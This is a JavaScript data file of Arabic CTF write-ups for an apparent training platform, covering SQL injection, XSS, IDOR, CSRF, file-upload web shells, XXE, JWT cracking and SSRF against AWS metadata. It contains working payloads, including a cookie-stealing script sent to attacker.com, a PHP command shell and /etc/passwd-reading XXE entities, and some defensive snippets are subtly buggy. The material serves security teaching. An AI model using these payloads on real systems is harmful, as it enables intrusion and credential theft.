// ==================== WRITEUPS DATA ====================
// حلول شاملة لجميع تحديات CTF

const writeups = [
    // SQL Injection
    {
        id: 'sqli-basic-writeup',
        challengeId: 'sql-injection-basic',
        category: 'web',
        difficulty: 'easy',
        title: 'SQL Injection - تجاوز المصادقة الأساسية',
        author: 'فريق BreachLabs',
        type: 'official',
        rating: 4.8,
        votes: 245,
        views: 3420,
        createdAt: Date.now() - (30 * 24 * 60 * 60 * 1000),
        tags: ['sqli', 'authentication', 'bypass'],
        content: `
# SQL Injection - تجاوز المصادقة

## 📋 نظرة عامة على التحدي
هذا التحدي يوضح ثغرة SQL Injection كلاسيكية في نموذج تسجيل الدخول حيث لا يتم تنقية مدخلات المستخدم بشكل صحيح.

## 🎯 أهداف التعلم
- فهم أساسيات SQL Injection
- تجاوز آليات المصادقة
- استغلال ضعف التحقق من المدخلات

## 🔍 الاستكشاف

أولاً، دعنا نحلل نموذج تسجيل الدخول:

\`\`\`html
<form action="/login" method="POST">
  <input type="text" name="username">
  <input type="password" name="password">
</form>
\`\`\`

الكود الخلفي على الأرجح يستخدم استعلام مثل:

\`\`\`sql
SELECT * FROM users WHERE username='$username' AND password='$password'
\`\`\`

## 💡 الاستغلال

### الطريقة 1: التجاوز باستخدام التعليقات

**الحمولة:** \`admin' --\`

**الشرح:**
- \`admin'\` يغلق نص اسم المستخدم
- \`--\` يعلق على بقية الاستعلام

**الاستعلام النهائي:**
\`\`\`sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
\`\`\`

### الطريقة 2: التجاوز باستخدام OR

**الحمولة:** \`' OR '1'='1\`

## 🚀 الحل خطوة بخطوة

1. انتقل إلى صفحة تسجيل الدخول
2. أدخل الحمولة في حقل اسم المستخدم: \`admin' --\`
3. أدخل أي شيء في حقل كلمة المرور
4. اضغط على تسجيل الدخول
5. نجاح! أنت الآن مسجل دخول كمسؤول

## 🛡️ الحماية

\`\`\`python
# سيء - كود ضعيف
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

# جيد - استعلام معلمي
query = "SELECT * FROM users WHERE username=? AND password=?"
cursor.execute(query, (username, password))
\`\`\`

## 🔑 النقاط الرئيسية
- لا تثق أبداً في مدخلات المستخدم
- استخدم دائماً الاستعلامات المعلمية
- طبق التحقق من صحة المدخلات
- استخدم العبارات المُعدة مسبقاً

## 📚 موارد إضافية
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
        `
    },

    // XSS
    {
        id: 'xss-reflected-writeup',
        challengeId: 'xss-reflected',
        category: 'web',
        difficulty: 'easy',
        title: 'Reflected XSS - سرقة الكوكيز',
        author: 'فريق BreachLabs',
        type: 'official',
        rating: 4.7,
        votes: 198,
        views: 2850,
        createdAt: Date.now() - (25 * 24 * 60 * 60 * 1000),
        tags: ['xss', 'reflected', 'cookie-stealing'],
        content: `
# Reflected XSS - سرقة الكوكيز

## 📋 نظرة عامة
هذا التحدي يوضح ثغرة XSS منعكسة حيث يتم عرض مدخلات المستخدم مباشرة في الصفحة بدون تنقية.

## 🎯 أهداف التعلم
- فهم هجمات XSS
- تقنيات سرقة الكوكيز
- التلاعب بـ DOM

## 🔍 تحليل الثغرة

الكود الضعيف:
\`\`\`php
<?php
  $search = $_GET['q'];
  echo "نتائج البحث عن: " . $search;
?>
\`\`\`

## 💡 الاستغلال

### اختبار XSS الأساسي
**الحمولة:** \`<script>alert('XSS')</script>\`

### سرقة الكوكيز
\`\`\`html
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
\`\`\`

### تجاوز الفلاتر

إذا تم حظر الحمولات الأساسية، جرب:
\`\`\`html
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<iframe src="javascript:alert('XSS')">
\`\`\`

## 🚀 الحل خطوة بخطوة

1. ابحث عن معامل البحث
2. اختبر بـ: \`?q=<script>alert(1)</script>\`
3. إذا تم الحظر، جرب حمولات بديلة
4. اسرق الكوكيز

## 🛡️ الحماية

\`\`\`php
// سيء
echo $search;

// جيد
echo htmlspecialchars($search, ENT_QUOTES, 'UTF-8');
\`\`\`

## 🔑 النقاط الرئيسية
- قم دائماً بترميز المخرجات
- استخدم Content Security Policy
- اضبط علامة HttpOnly على الكوكيز
- تحقق من صحة المدخلات ونقّها

## 📚 موارد إضافية
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
        `
    },

    // IDOR
    {
        id: 'idor-user-profile-writeup',
        challengeId: 'idor-user-profile',
        category: 'web',
        difficulty: 'medium',
        title: 'IDOR - الوصول لملفات المستخدمين',
        author: 'فريق BreachLabs',
        type: 'official',
        rating: 4.9,
        votes: 312,
        views: 4120,
        createdAt: Date.now() - (20 * 24 * 60 * 60 * 1000),
        tags: ['idor', 'access-control', 'authorization'],
        content: `
# IDOR - Insecure Direct Object Reference

## 📋 نظرة عامة
ثغرة IDOR تسمح للمهاجم بالوصول إلى بيانات مستخدمين آخرين عن طريق التلاعب بمعرفات الكائنات.

## 🎯 أهداف التعلم
- فهم ثغرات IDOR
- استغلال ضعف التحكم في الوصول
- تعداد الموارد

## 🔍 تحليل الثغرة

نقطة النهاية الضعيفة:
\`\`\`
GET /api/users/101
\`\`\`

التطبيق لا يتحقق من صلاحيات المستخدم المسجل.

## 💡 الاستغلال

### الخطوة 1: تحديد معرف المستخدم
سجل الدخول وتحقق من رابط ملفك الشخصي:
\`\`\`
https://target.com/profile?id=101
\`\`\`

### الخطوة 2: تعداد المستخدمين
جرب معرفات مختلفة:
\`\`\`
https://target.com/profile?id=100
https://target.com/profile?id=102
\`\`\`

## 🚀 الحل خطوة بخطوة

1. سجل الدخول إلى حسابك
2. انتقل إلى صفحة الملف الشخصي
3. غيّر معامل ID
4. الوصول إلى ملف المسؤول
5. استخرج البيانات الحساسة

## 🛡️ الحماية

\`\`\`python
# سيء - لا يوجد فحص للصلاحيات
@app.route('/api/users/<user_id>')
def get_user(user_id):
    return User.query.get(user_id)

# جيد - فحص صحيح للصلاحيات
@app.route('/api/users/<user_id>')
def get_user(user_id):
    current_user = get_current_user()
    if current_user.id != user_id and not current_user.is_admin:
        return {"error": "غير مصرح"}, 403
    return User.query.get(user_id)
\`\`\`

## 🔑 النقاط الرئيسية
- تحقق دائماً من صلاحيات المستخدم
- استخدم معرفات غير متسلسلة
- طبق التحكم في الوصول بشكل صحيح
- سجل محاولات الوصول المشبوهة

## 📚 موارد إضافية
- [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/)
        `
    },

    // CSRF
    {
        id: 'csrf-password-change-writeup',
        challengeId: 'csrf-password-change',
        category: 'web',
        difficulty: 'medium',
        title: 'CSRF - هجوم تغيير كلمة المرور',
        author: 'فريق BreachLabs',
        type: 'official',
        rating: 4.6,
        votes: 187,
        views: 2640,
        createdAt: Date.now() - (15 * 24 * 60 * 60 * 1000),
        tags: ['csrf', 'session', 'password-change'],
        content: `
# CSRF - Cross-Site Request Forgery

## 📋 نظرة عامة
استغلال ثغرة CSRF لتغيير كلمة مرور مستخدم آخر بدون علمه.

## 🎯 أهداف التعلم
- فهم هجمات CSRF
- إنشاء نماذج خبيثة
- تجاوز الحماية الضعيفة

## 🔍 تحليل الثغرة

نقطة النهاية الضعيفة:
\`\`\`
POST /change-password
Parameters: new_password
\`\`\`

لا يوجد التحقق من رمز CSRF!

## 💡 الاستغلال

### إنشاء صفحة HTML خبيثة

\`\`\`html
<!DOCTYPE html>
<html>
<head>
    <title>عرض خاص!</title>
</head>
<body>
    <h1>تهانينا! لقد فزت بجائزة</h1>
    <form id="csrf-form" action="https://target.com/change-password" method="POST">
        <input type="hidden" name="new_password" value="hacked123">
    </form>
    <script>
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
\`\`\`

## 🚀 الحل خطوة بخطوة

1. حلل طلب تغيير كلمة المرور
2. أنشئ نموذجاً خبيثاً
3. استضف على خادمك
4. أرسل للضحية
5. تم تغيير كلمة مرور الضحية!

## 🛡️ الحماية

\`\`\`python
# توليد رمز CSRF
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

# التحقق من الرمز
@app.route('/change-password', methods=['POST'])
@csrf_protect
def change_password():
    new_password = request.form['new_password']
    return {"success": True}
\`\`\`

## 🔑 النقاط الرئيسية
- استخدم دائماً رموز CSRF
- تحقق من رأس Referer
- استخدم كوكيز SameSite
- اطلب إعادة المصادقة للإجراءات الحساسة

## 📚 موارد إضافية
- [OWASP CSRF](https://owasp.org/www-community/attacks/csrf)
        `
    },

    // File Upload
    {
        id: 'file-upload-rce-writeup',
        challengeId: 'file-upload-rce',
        category: 'web',
        difficulty: 'hard',
        title: 'File Upload - تنفيذ أكواد عن بُعد',
        author: 'فريق BreachLabs',
        type: 'official',
        rating: 4.8,
        votes: 289,
        views: 3890,
        createdAt: Date.now() - (10 * 24 * 60 * 60 * 1000),
        tags: ['file-upload', 'rce', 'webshell'],
        content: `
# File Upload - Remote Code Execution

## 📋 نظرة عامة
استغلال ثغرة رفع الملفات للحصول على تنفيذ أكواد عن بُعد على الخادم.

## 🎯 أهداف التعلم
- فهم ثغرات رفع الملفات
- رفع Web Shell
- الحصول على RCE

## 🔍 تحليل الثغرة

الكود الضعيف:
\`\`\`php
<?php
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["file"]["name"]);
move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
?>
\`\`\`

المشكلة: لا يوجد فحص لنوع الملف!

## 💡 الاستغلال

### الخطوة 1: إنشاء PHP Web Shell

\`\`\`php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
\`\`\`

### الخطوة 2: تجاوز فلاتر الامتداد

إذا كان هناك فحص للامتداد، جرب:
\`\`\`
shell.php
shell.php5
shell.phtml
shell.php.jpg
\`\`\`

## 🚀 الحل خطوة بخطوة

1. أنشئ Web Shell
2. ارفع الملف
3. نفذ الأوامر
4. احصل على Reverse Shell

## 🛡️ الحماية

\`\`\`php
<?php
// جيد - فحص شامل
$allowed_types = ['image/jpeg', 'image/png'];
$allowed_extensions = ['jpg', 'jpeg', 'png'];

$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);

if (!in_array($mime_type, $allowed_types)) {
    die("نوع ملف غير مسموح");
}

$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed_extensions)) {
    die("امتداد غير مسموح");
}
?>
\`\`\`

## 🔑 النقاط الرئيسية
- تحقق من نوع MIME الفعلي
- استخدم whitelist للامتدادات المسموحة
- أعد تسمية الملفات المرفوعة
- احفظ الملفات خارج webroot

## 📚 موارد إضافية
- [OWASP File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
        `
    },

    // XXE
    {
        id: 'xxe-file-read-writeup',
        challengeId: 'xxe-basic',
        category: 'web',
        difficulty: 'medium',
        title: 'XXE - قراءة ملفات النظام',
        author: 'فريق BreachLabs',
        type: 'official',
        rating: 4.7,
        votes: 234,
        views: 3120,
        createdAt: Date.now() - (8 * 24 * 60 * 60 * 1000),
        tags: ['xxe', 'xml', 'file-read'],
        content: `
# XXE - XML External Entity Injection

## 📋 نظرة عامة
استغلال XXE لقراءة ملفات حساسة من الخادم.

## 🎯 أهداف التعلم
- فهم XML وكيفية معالجته
- استغلال External Entities
- قراءة ملفات النظام

## 🔍 تحليل الثغرة

الكود الضعيف:
\`\`\`php
<?php
$xml = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
?>
\`\`\`

المشكلة: يسمح بمعالجة External Entities.

## 💡 الاستغلال

### Payload أساسي

\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
\`\`\`

### قراءة ملفات حساسة

\`\`\`xml
<!-- قراءة /etc/passwd -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- قراءة كود PHP -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
\`\`\`

## 🚀 الحل خطوة بخطوة

1. حدد نقطة النهاية التي تقبل XML
2. أنشئ payload XXE
3. اقرأ الملفات الحساسة
4. استخرج البيانات

## 🛡️ الحماية

\`\`\`php
// سيء
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

// جيد - تعطيل external entities
libxml_disable_entity_loader(true);
$dom->loadXML($xml, LIBXML_NONET);
\`\`\`

## 🔑 النقاط الرئيسية
- عطّل دائماً external entities
- استخدم مكتبات آمنة
- تحقق من بنية XML
- استخدم JSON بدلاً من XML إن أمكن

## 📚 موارد إضافية
- [OWASP XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
        `
    },

    // JWT
    {
        id: 'jwt-weak-secret-writeup',
        challengeId: 'jwt-weak',
        category: 'web',
        difficulty: 'medium',
        title: 'JWT - تجاوز المصادقة بسر ضعيف',
        author: 'فريق BreachLabs',
        type: 'official',
        rating: 4.6,
        votes: 201,
        views: 2890,
        createdAt: Date.now() - (12 * 24 * 60 * 60 * 1000),
        tags: ['jwt', 'authentication', 'weak-secret'],
        content: `
# JWT Authentication Bypass

## 📋 نظرة عامة
استغلال سر JWT ضعيف لتزوير رموز المسؤول والحصول على وصول غير مصرح به.

## 🎯 أهداف التعلم
- فهم بنية JWT
- كسر الأسرار الضعيفة
- تزوير الرموز

## 🔍 بنية JWT

JWT يتكون من ثلاثة أجزاء:
\`\`\`
header.payload.signature
\`\`\`

مثال:
\`\`\`
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiJ9.signature
\`\`\`

## 💡 الاستغلال

### الخطوة 1: كسر السر

\`\`\`bash
# استخدام hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# استخدام jwt_tool
python3 jwt_tool.py <JWT> -C -d wordlist.txt
\`\`\`

### الخطوة 2: تزوير رمز المسؤول

\`\`\`python
import jwt

payload = {
    "user": "admin",
    "role": "admin"
}

secret = "secret123"
token = jwt.encode(payload, secret, algorithm="HS256")
print(f"الرمز المزور: {token}")
\`\`\`

## 🚀 الحل خطوة بخطوة

1. احصل على رمز JWT
2. حاول كسر السر
3. زوّر رمز مسؤول
4. استخدم الرمز المزور

## 🛡️ الحماية

\`\`\`python
# سيء - سر ضعيف
secret = "secret123"

# جيد - سر قوي عشوائي
import secrets
secret = secrets.token_urlsafe(32)

# أفضل - استخدام RS256
from cryptography.hazmat.primitives.asymmetric import rsa
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
token = jwt.encode(payload, private_key, algorithm="RS256")
\`\`\`

## 🔑 النقاط الرئيسية
- استخدم أسراراً قوية وعشوائية
- فكر في استخدام خوارزميات غير متماثلة
- طبق انتهاء صلاحية الرموز
- دوّر الأسرار بانتظام

## 📚 موارد إضافية
- [JWT.io](https://jwt.io/)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
        `
    },

    // SSRF
    {
        id: 'ssrf-cloud-metadata-writeup',
        challengeId: 'ssrf-cloud',
        category: 'web',
        difficulty: 'hard',
        title: 'SSRF - استغلال AWS Metadata',
        author: 'فريق BreachLabs',
        type: 'official',
        rating: 4.9,
        votes: 267,
        views: 3560,
        createdAt: Date.now() - (5 * 24 * 60 * 60 * 1000),
        tags: ['ssrf', 'aws', 'cloud', 'metadata'],
        content: `
# SSRF - Server-Side Request Forgery

## 📋 نظرة عامة
استغلال SSRF للوصول إلى AWS Metadata Service والحصول على بيانات اعتماد IAM.

## 🎯 أهداف التعلم
- فهم SSRF وكيفية استغلاله
- الوصول إلى Cloud Metadata Services
- استخراج AWS Credentials

## 🔍 تحليل الثغرة

التطبيق يسمح بإدخال URL لجلب محتوى خارجي:

\`\`\`php
<?php
$url = $_GET['url'];
$content = file_get_contents($url);
echo $content;
?>
\`\`\`

### AWS Metadata Endpoint
\`\`\`
http://169.254.169.254/latest/meta-data/
\`\`\`

## 💡 الاستغلال

### الخطوة 1: اختبار SSRF

\`\`\`bash
# اختبار SSRF أساسي
http://target.com/fetch?url=http://169.254.169.254/

# إذا تم الحظر، جرب تقنيات التجاوز
http://target.com/fetch?url=http://2852039166/
\`\`\`

### الخطوة 2: استكشاف Metadata

\`\`\`bash
# قائمة metadata المتاحة
/latest/meta-data/

# الحصول على اسم IAM role
/latest/meta-data/iam/security-credentials/
\`\`\`

### الخطوة 3: سرقة Credentials

\`\`\`bash
# الحصول على credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/MyEC2Role
\`\`\`

## 🚀 الحل خطوة بخطوة

1. اختبر SSRF
2. استكشف metadata
3. اسرق credentials
4. استخدم credentials للوصول لـ AWS

## 🛡️ الحماية

\`\`\`python
# سيء - لا يوجد فحص
def fetch_url(url):
    return requests.get(url).text

# جيد - نهج القائمة البيضاء
ALLOWED_DOMAINS = ['api.example.com']

def fetch_url(url):
    from urllib.parse import urlparse
    import ipaddress
    
    parsed = urlparse(url)
    
    # حظر IPs الخاصة
    try:
        ip = socket.gethostbyname(parsed.hostname)
        if ipaddress.ip_address(ip).is_private:
            raise ValueError("IPs خاصة غير مسموحة")
    except:
        raise ValueError("hostname غير صالح")
    
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError("النطاق غير مدرج في القائمة البيضاء")
    
    return requests.get(url, timeout=5).text
\`\`\`

## 🔑 النقاط الرئيسية
- تحقق دائماً من URLs قبل جلب المحتوى
- استخدم قائمة بيضاء للنطاقات المسموحة
- احظر نطاقات IPs الخاصة
- استخدم IMDSv2 في AWS
- طبق مبدأ الامتياز الأدنى على IAM roles

## 📚 موارد إضافية
- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [AWS IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
        `
    }
];

// Export for use
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { writeups };
}
